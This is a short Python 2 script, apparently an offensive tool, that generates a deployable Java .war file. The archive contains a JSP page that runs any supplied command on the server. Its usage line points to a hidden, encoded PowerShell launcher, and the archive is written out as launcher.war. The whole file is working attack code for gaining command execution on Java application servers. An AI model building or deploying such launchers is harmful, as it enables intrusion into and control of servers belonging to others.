#!/usr/bin/python

# Code that quickly generates a deployable .war for a PowerShell one-liner

import zipfile
import StringIO
import sys

def generatePsWar(psCmd, appName):

    # .war manifest
    manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_35 (Sun Microsystems Inc.)\r\n\r\n"

    # Create initial JSP and Web XML Strings with placeholders
    jspCode = '''<%@ page import="java.io.*" %>
<% 
Process p=Runtime.getRuntime().exec("'''+str(psCmd)+'''");
%>
'''

    # .xml deployment config
    wxmlCode = '''<?xml version="1.0"?>
<!DOCTYPE web-app PUBLIC 
"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" 
"http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app>
<servlet>
<servlet-name>%s</servlet-name>
<jsp-file>/%s.jsp</jsp-file>
</servlet>
</web-app>
''' %(appName, appName)

    # build the in-memory ZIP and write the three files in
    warFile = StringIO.StringIO() 
    zipData = zipfile.ZipFile(warFile, 'w', zipfile.ZIP_DEFLATED)

    zipData.writestr("META-INF/MANIFEST.MF", manifest)
    zipData.writestr("WEB-INF/web.xml", wxmlCode)
    zipData.writestr(appName + ".jsp", jspCode)
    zipData.close()

    return warFile.getvalue()


if len(sys.argv) != 2:
	print "\nUsage: ./pswar.py 'powershell -w hidden -nop -enc BLAH'\n"


else:

	war = generatePsWar(sys.argv[1], 'launcher')

	f = open("launcher.war", 'wb')
	f.write(war)
	f.close()

	print "\nLauncher WAR written to launcher.war\n"
